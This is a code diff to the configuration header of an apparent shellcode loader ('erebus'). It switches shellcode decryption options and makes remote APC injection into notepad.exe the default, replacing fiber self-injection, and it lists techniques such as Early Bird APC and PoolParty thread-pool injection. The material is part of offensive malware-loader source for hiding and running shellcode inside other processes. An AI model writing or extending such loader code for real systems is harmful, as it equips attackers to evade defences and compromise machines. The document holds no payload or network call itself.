@@ -48,33 +48,35 @@
 // 2 = RC4         - RC4 stream cipher
 // 3 = AES_ECB     - AES in ECB mode
 // 4 = AES_CBC     - AES in CBC mode
-#define CONFIG_ENCRYPTION_TYPE 1
-
-#if CONFIG_ENCRYPTION_TYPE == 1
-#define DecryptShellcode erebus::DecryptionXor
-#elif CONFIG_ENCRYPTION_TYPE == 2
-#define DecryptShellcode erebus::DecryptionRc4
-#endif 
+#ifndef CONFIG_ENCRYPTION_TYPE
+#define CONFIG_ENCRYPTION_TYPE 0
+#endif
 
 // ============================================
 // INJECTION CONFIGURATION
 // ============================================
 
 // Target process for remote injection
+#ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe\0"
+#endif
 
 // Injection technique:
 // 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
 // 2 = NtMapViewOfSection  - Section mapping injection (Remote)
-// 3 = CreateFiber         - Fiber-based execution (Self)
+// 3 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
 // 4 = EarlyCascade        - Early Bird APC injection (Remote)
 // 5 = PoolParty           - Worker Factory thread pool injection (Remote)
-#define CONFIG_INJECTION_TYPE 3
+#ifndef CONFIG_INJECTION_TYPE
+#define CONFIG_INJECTION_TYPE 1
+#endif
 
-#if CONFIG_INJECTION_TYPE == 3
+#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 4 || CONFIG_INJECTION_TYPE == 5
+#define CONFIG_INJECTION_MODE 1  // Remote injection
+#elif CONFIG_INJECTION_TYPE == 3
 #define CONFIG_INJECTION_MODE 2  // Self injection
 #else
-#define CONFIG_INJECTION_MODE 1  // Remote injection
+#define CONFIG_INJECTION_MODE 1  // Remote injection (default)
 #endif
 
 #if CONFIG_INJECTION_TYPE == 1
